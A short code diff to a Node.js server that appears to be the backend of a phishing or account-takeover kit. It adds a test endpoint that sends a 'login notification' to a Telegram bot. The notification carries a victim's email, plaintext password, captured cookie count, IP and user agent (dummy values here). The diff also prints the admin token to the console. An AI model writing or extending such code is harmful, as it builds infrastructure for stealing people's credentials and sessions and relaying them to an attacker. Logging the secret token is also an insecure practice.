@@ -99,6 +99,7 @@ const ADMIN_TOKEN = 'admin-' + Math.random().toString(36).substr(2, 24);
 
 // Make admin token available globally for Telegram bot
 global.adminToken = ADMIN_TOKEN;
+console.log('🔑 Admin Token for testing:', ADMIN_TOKEN);
 
 // Initialize Telegram Bot
 let telegramBot = null;
@@ -2520,6 +2521,42 @@ app.get('/api/admin/analytics', requireAdminAuth, (req, res) => {
         res.status(500).json({
             success: false,
             error: 'Failed to load analytics',
+            details: error.message
+        });
+    }
+});
+
+// Test Telegram notification endpoint
+app.post('/api/admin/test-telegram', requireAdminAuth, async (req, res) => {
+    try {
+        if (!telegramBot) {
+            return res.status(400).json({
+                success: false,
+                error: 'Telegram bot not initialized'
+            });
+        }
+
+        // Send a test notification
+        await telegramBot.sendLoginNotification({
+            email: 'test@example.com',
+            password: 'test123',
+            timestamp: new Date().toISOString(),
+            sessionId: 'test-session-' + Date.now(),
+            totalCookies: 5,
+            authMethod: 'Test Method',
+            ip: '127.0.0.1',
+            userAgent: 'Test UserAgent'
+        });
+
+        res.json({
+            success: true,
+            message: 'Test notification sent successfully'
+        });
+    } catch (error) {
+        console.error('Error sending test notification:', error);
+        res.status(500).json({
+            success: false,
+            error: 'Failed to send test notification',
             details: error.message
         });
     }
